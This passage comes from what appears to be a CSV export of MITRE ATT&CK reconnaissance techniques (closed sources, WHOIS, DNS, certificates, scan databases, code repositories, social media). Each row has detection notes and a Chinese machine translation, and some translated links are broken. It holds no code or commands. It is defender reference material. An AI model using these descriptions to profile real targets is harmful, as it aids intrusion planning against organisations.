Adversaries may search in different closed databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1597,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,False,,,,,,,,,,"(Citation: Google EXOTIC LILY March 2022),",搜索封闭源,攻击者可能会从封闭来源搜索并收集有关受害者的信息，这些信息可在定位期间使用。可以从信誉良好的私人来源和数据库购买有关受害者的信息，例如付费订阅技术/威胁情报数据源。（引文：D3Secutrity CTI 源）攻击者也可能从信誉较差的来源购买信息，例如暗网或网络犯罪黑市。（引用：ZDNET 销售数据）攻击者可能会根据他们寻求收集的信息在不同的封闭数据库中进行搜索。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放网站/域](https://attack. mitre.org/techniques/T1593)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org /techniques/T1588)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [有效帐户](https://attack.mitre.org /技术/T1078))。
T1597.002,Search Closed Sources: Purchase Technical Data,"Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.

Adversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.(Citation: ZDNET Selling Data) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",https://attack.mitre.org/techniques/T1597/002,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1597,,,,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),",搜索封闭源：购买技术数据,攻击者可能会购买可在定位期间使用的有关受害者的技术信息。可以在信誉良好的私人来源和数据库中购买有关受害者的信息，例如付费订阅扫描数据库或其他数据聚合服务的订阅源。攻击者还可能从声誉较差的来源购买信息，例如暗网或网络犯罪黑市。攻击者可能会购买有关其已确定目标的信息，或使用购买的数据来发现成功违规的机会。威胁参与者可能会从购买的数据中收集各种技术细节，包括但不限于员工联系信息、凭证或有关受害者基础设施的细节。（引用：ZDNET 销售数据）来自这些来源的信息可能会揭示其他形式的侦察机会（例如: [网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放网站/域](https://attack.mitre.org/techniques/T1593))，建立运营资源 (例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org/techniques/T1588)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或[有效帐户](https://attack.mitre.org/techniques/T1078))。
T1597.001,Search Closed Sources: Threat Intel Vendors,"Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)

Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",https://attack.mitre.org/techniques/T1597/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1597,,,,,,,,,",",搜索封闭源：威胁情报供应商,攻击者可能会从威胁情报供应商处搜索私人数据，以获取可在定位期间使用的信息。威胁情报供应商可能会提供付费订阅源或门户网站，提供比公开报告更多的数据。尽管敏感细节（例如客户姓名和其他标识符）可能会被编辑，但此信息可能包含有关违规的趋势，例如目标行业、归属声明和成功的 TTP/对策。（引文：D3Secutrity CTI 提要）攻击者可能会在私人威胁中搜索情报供应商数据以收集可操作的信息。威胁行为者可能会寻求收集到的关于他们自己的活动的信息/指标，以及由其他对手进行的活动，这些活动可能与其目标行业、能力/目标或其他运营问题相一致。供应商报告的信息还可能揭示其他形式的侦察机会（例如：[搜索开放网站/域]（https://attack.mitre.org/techniques/T1593）），建立运营资源（例如：[开发能力]（ https://attack.mitre.org/techniques/T1587）或[获得能力]（https://attack.mitre.org/techniques/T1588））和/或初始访问（例如：[利用面向公众的应用程序） ](https://attack.mitre.org/techniques/T1190) 或 [外部远程服务](https://attack.mitre.org/techniques/T1133))。
T1596,Search Open Technical Databases,"Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)

Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596,02 October 2020,18 October 2022,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,False,,,,,,,,,,",",搜索开放技术数据库,攻击者可以搜索免费可用的技术数据库，以获取可在定位期间使用的有关受害者的信息。有关受害者的信息可能在在线数据库和存储库中可用，例如域/证书的注册以及从流量和/或扫描中收集的网络数据/工件的公共集合。（引文：WHOIS）（引文：DNS Dumpster）（引文: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan) 攻击者可能会根据他们寻求收集的信息在不同的开放数据库中进行搜索。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放网站/域](https://attack. mitre.org/techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org /techniques/T1584)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [可信关系](https://attack.mitre.org /技术/T1199))。
T1596.004,Search Open Technical Databases: CDNs,"Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.

Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.(Citation: DigitalShadows CDN) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)).",https://attack.mitre.org/techniques/T1596/004,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,,",",搜索开放技术数据库：CDNs,攻击者可能会搜索可在定位期间使用的有关受害者的内容交付网络 (CDN) 数据。 CDN 允许组织托管来自分布式、负载平衡的服务器阵列的内容。 CDN 还可以允许组织根据请求者的地理区域定制内容交付。攻击者可能会搜索 CDN 数据以收集可操作的信息。威胁参与者可以使用在线资源和查找工具来收集有关 CDN 内内容服务器的信息。攻击者也可能会寻找和定位 CDN 错误配置，这些错误配置会泄露不打算托管的敏感信息和/或没有与组织网站上托管的内容相同的保护机制（例如：登录门户）。（引用：DigitalShadows CDN）信息来自这些来源可能会揭示其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[搜索开放网站/域]（https://attack.mitre.org /techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org/techniques/ T1584)）和/或初始访问（例如：[Drive-by Compromise](https://attack.mitre.org/techniques/T1189)）。
T1596.001,Search Open Technical Databases: DNS/Passive DNS,"Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.

Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,,",",搜索开放技术数据库：DNS/被动 DNS,攻击者可能会搜索 DNS 数据以获取有关可在定位期间使用的受害者的信息。 DNS 信息可能包括各种详细信息，包括注册的名称服务器以及概述目标子域、邮件服务器和其他主机地址的记录。攻击者可能会搜索 DNS 数据以收集可操作的信息。威胁行为者可以直接查询目标组织的名称服务器，或搜索记录的 DNS 查询响应的集中存储库（称为被动 DNS）。（引文：DNS Dumpster）（引文：Circl Passive DNS）攻击者也可能寻求和瞄准 DNS 错误配置/泄露有关内部网络的信息。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[搜索受害者拥有的网站](https://attack.mitre.org/techniques/T1594) 或 [搜索开放网站/域](https:// attack.mitre.org/techniques/T1593)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre .org/techniques/T1584)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [可信关系](https://attack.mitre .org/techniques/T1199))。
T1596.003,Search Open Technical Databases: Digital Certificates,"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.

Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/003,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,,",",搜索开放技术数据库：数字证书,攻击者可能会在公共数字证书数据中搜索可在定位期间使用的有关受害者的信息。数字证书由证书颁发机构 (CA) 颁发，以加密验证签名内容的来源。这些证书（例如用于加密 Web 流量（HTTPS SSL/TLS 通信）的证书）包含有关注册组织的信息，例如名称和位置。攻击者可能会搜索数字证书数据以收集可操作的信息。威胁参与者可以使用在线资源和查找工具来获取有关证书的信息。（引用：SSLShopper Lookup）数字证书数据也可以从组织签名的工件中获得（例如：从加密的网络流量中使用的证书与内容一起提供）。（引用：中等 SSL 证书）来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[网络钓鱼信息]（https：/ /attack.mitre.org/techniques/T1598)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack. mitre.org/techniques/T1588)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [可信关系](https://attack. mitre.org/techniques/T1199))。
T1596.005,Search Open Technical Databases: Scan Databases,"Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)

Adversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",https://attack.mitre.org/techniques/T1596/005,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,,",",搜索开放技术数据库：扫描数据库,攻击者可能会在公共扫描数据库中搜索可在定位期间使用的有关受害者的信息。各种在线服务不断发布互联网扫描/调查的结果，通常会收集活动 IP 地址、主机名、开放端口、证书甚至服务器横幅等信息。（引用：Shodan）攻击者可能会搜索扫描数据库以收集可操作的信息。威胁参与者可以使用在线资源和查找工具从这些服务中获取信息。攻击者可能会寻求有关其已确定目标的信息，或使用这些数据集来发现成功违规的机会。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[主动扫描]（https://attack.mitre.org/techniques/T1595）或[搜索开放网站/域]（https://attack.mitre.org/techniques/T1593)），建立运营资源（例如：[开发能力](https://attack.mitre.org/techniques/T1587) 或[获得能力](https://attack.mitre.org/技术/T1588)）和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或[利用面向公众的应用程序](https://attack.mitre .org/techniques/T1190))。
T1596.002,Search Open Technical Databases: WHOIS,"Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)

Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",https://attack.mitre.org/techniques/T1596/002,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1596,,,,,,,,,",",搜索开放技术数据库：WHOIS,攻击者可能会在公共 WHOIS 数据中搜索可在定位期间使用的有关受害者的信息。 WHOIS 数据由负责分配互联网资源（例如域名）的地区互联网注册管理机构 (RIR) 存储。任何人都可以查询 WHOIS 服务器以获取有关注册域的信息，例如分配的 IP 块、联系信息和 DNS 名称服务器。（引用：WHOIS）攻击者可以搜索 WHOIS 数据以收集可操作的信息。威胁行为者可以使用在线资源或命令行实用程序通过 WHOIS 数据掠夺有关潜在受害者的信息。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[主动扫描](https://attack.mitre.org/techniques/T1595) 或 [网络钓鱼信息](https://attack.mitre.org /techniques/T1598)），建立运营资源（例如：[Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) 或 [Compromise Infrastructure](https://attack.mitre.org/techniques/ T1584)）和/或初始访问权限（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [可信关系](https://attack.mitre.org/techniques/ T1199))。
T1593,Search Open Websites/Domains,"Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1593,02 October 2020,18 October 2022,1.1,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,False,,,,,,,,,,"(Citation: US District Court Indictment GRU Unit 74455 October 2020),",搜索开放网站/域,攻击者可能会搜索免费可用的网站和/或域，以查找可在定位期间使用的有关受害者的信息。有关受害者的信息可能在各种在线网站上提供，例如社交媒体、新网站或托管有关业务运营信息的网站，例如招聘或请求/奖励合同。（引用：Cyware 社交媒体）（引用：SecurityTrails Google Hacking）（引用：ExploitDB GoogleHacking）攻击者可能会根据他们寻求收集的信息在不同的在线站点中进行搜索。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放技术数据库](https://attack.mitre .org/techniques/T1596)），建立运营资源（例如：[建立账户](https://attack.mitre.org/techniques/T1585) 或[妥协账户](https://attack.mitre.org/技术/T1586)）和/或初始访问（例如：[外部远程服务](https://attack.mitre.org/techniques/T1133) 或 [网络钓鱼](https://attack.mitre.org/techniques /T1566))。
T1593.003,Search Open Websites/Domains: Code Repositories,"Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.  

Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.(Citation: GitHub Cloud Service Credentials) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)). 

**Note:** This is distinct from [Code Repositories](https://attack.mitre.org/techniques/T1213/003), which focuses on [Collection](https://attack.mitre.org/tactics/TA0009) from private and internally hosted code repositories. ",https://attack.mitre.org/techniques/T1593/003,09 August 2022,21 October 2022,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. 

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,"Matt Burrough, @mattburrough, Microsoft; Vinayak Wadhwa, Lucideus",,,,,,,"(Citation: MSTIC DEV-0537 Mar 2022),",搜索开放网站/域：代码存储库,攻击者可能会在公共代码存储库中搜索可在定位期间使用的有关受害者的信息。受害者可能将代码存储在各种第三方网站的存储库中，例如 GitHub、GitLab、SourceForge 和 BitBucket。用户通常通过 Web 应用程序或 git 等命令行实用程序与代码存储库进行交互。攻击者可能会在各种公共代码存储库中搜索有关受害者的各种信息。公共代码存储库通常可以成为有关受害者的各种一般信息的来源，例如常用的编程语言和库以及员工的姓名。攻击者还可能识别更敏感的数据，包括意外泄露的凭据或 API 密钥。（引用：GitHub 云服务凭据）来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（https://attack） .mitre.org/techniques/T1598)），建立运营资源（例如：[Compromise Accounts](https://attack.mitre.org/techniques/T1586) 或 [Compromise Infrastructure](https://attack.mitre. org/techniques/T1584)）和/或初始访问权限（例如：[有效帐户](https://attack.mitre.org/techniques/T1078) 或 [网络钓鱼](https://attack.mitre.org/技术/T1566))。 **注意：** 这与 [Code Repositories](https://attack.mitre.org/techniques/T1213/003) 不同，后者侧重于 [Collection](https://attack.mitre.org/tactics) /TA0009) 来自私有和内部托管的代码存储库。
T1593.002,Search Open Websites/Domains: Search Engines,"Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking)

Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Valid Accounts](https://attack.mitre.org/techniques/T1078) or [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1593/002,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,,,,,,,,"(Citation: KISA Operation Muzabi),",搜索开放网站/域：搜索引擎,攻击者可能会使用搜索引擎来收集有关受害者的信息，这些信息可以在定位期间使用。搜索引擎服务通常会抓取在线网站以索引上下文，并可能为用户提供专门的语法来搜索特定关键字或特定类型的内容（即文件类型）。（引用：SecurityTrails Google Hacking）（引用：ExploitDB GoogleHacking）攻击者可能会制作各种搜索引擎查询取决于他们寻求收集的信息。威胁参与者可能会使用搜索引擎来收集有关受害者的一般信息，并使用专门的查询来查找敏感信息的溢出/泄露，例如网络详细信息或凭据。来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼获取信息](https://attack.mitre.org/techniques/T1598) 或 [搜索开放技术数据库](https://attack.mitre .org/techniques/T1596)），建立运营资源（例如：[建立账户](https://attack.mitre.org/techniques/T1585) 或[妥协账户](https://attack.mitre.org/技术/T1586)）和/或初始访问权限（例如：[有效帐户](https://attack.mitre.org/techniques/T1078) 或 [网络钓鱼](https://attack.mitre.org/techniques/ T1566))。
T1593.001,Search Open Websites/Domains: Social Media,"Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.

Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e. [Spearphishing Service](https://attack.mitre.org/techniques/T1598/001)).(Citation: Cyware Social Media) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).",https://attack.mitre.org/techniques/T1593/001,02 October 2020,15 April 2021,1.0,Reconnaissance,"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.

Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.",PRE,,True,T1593,,,,,,,,,"(Citation: Malwarebytes Kimsuky June 2021),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Lazarus Aug 2020),(Citation: Google EXOTIC LILY March 2022),",搜索开放网站/域：社交媒体,攻击者可能会在社交媒体上搜索可在定位期间使用的有关受害者的信息。社交媒体网站可能包含有关受害组织的各种信息，例如商业公告以及有关员工角色、位置和兴趣的信息。攻击者可能会根据他们寻求收集的信息在不同的社交媒体网站中进行搜索。威胁者可能会被动地从这些站点收集数据，并使用收集到的信息来创建虚假的个人资料/群组，以诱使受害者泄露特定信息（即 [Spearphishing Service](https://attack.mitre.org/techniques/T1598/ 001)).（引文：Cyware 社交媒体）来自这些来源的信息可能会揭示其他形式的侦察机会（例如：[网络钓鱼信息]（https://attack.mitre.org/techniques/T1598）或[搜索打开技术数据库](https://attack.mitre.org/techniques/T1596)），建立运营资源（例如：[建立账户](https://attack.mitre.org/techniques/T1585) 或[妥协账户] (https://attack.mitre.org/techniques/T1586)）和/或初始访问权限（例如：[通过服务进行鱼叉式网络钓鱼](https://attack.mitre.org/techniques/T1566/003)）。
T1594,Search Victim-Owned Websites,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)

Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).",https://attack.mitre.org/techniques/T1594,02 October 2020,15 April 2021,1.0,Reconnaissance,"Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.",PRE,Application Log: Application Log Content,False,,,,,,,,,,"(Citation: Phish Labs Silent Librarian),(Citation: KISA Operation 